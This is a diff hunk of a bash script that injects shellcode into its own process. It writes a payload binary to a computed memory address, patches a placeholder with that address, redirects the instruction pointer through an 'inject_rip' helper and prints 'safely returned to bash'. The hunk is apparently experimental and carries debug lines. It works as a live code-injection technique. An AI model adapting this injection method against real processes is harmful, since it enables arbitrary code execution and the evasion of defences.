@@ -43,5 +43,23 @@ inject_rip "$(<obj/malloc.bin)"
 # call libc write(), triggering shellcode
 :>/
 
-cat /proc/$$/maps
+a=$(xxd -p <a | swaps)
+# cat /proc/$$/maps
+# map=$(grep "rwxp" /proc/$$/maps | head -n1)
+# ptr=${map%%-*}
+ptr=$(printf "%08x" "$(( 0x$a ))")
+# ptr=$(printf "%08x" "$a")
+echo "--$ptr"
+
+#
+xxd -p -r <obj/payload.bin | seek "0x$ptr" 
+echo "a"
+#
+printf "%08x" "$(( 0x$ptr))"
+echo
+echo "aaaaaaaaaaaaaaaa"
+inject_rip "$(sed "s/aaaaaaaaaaaa/$(printf "%08x" "$(( 0x$ptr))" | swaps)/g" < obj/exec.bin)"
+:>/
+
 echo "safely returned to bash"
+
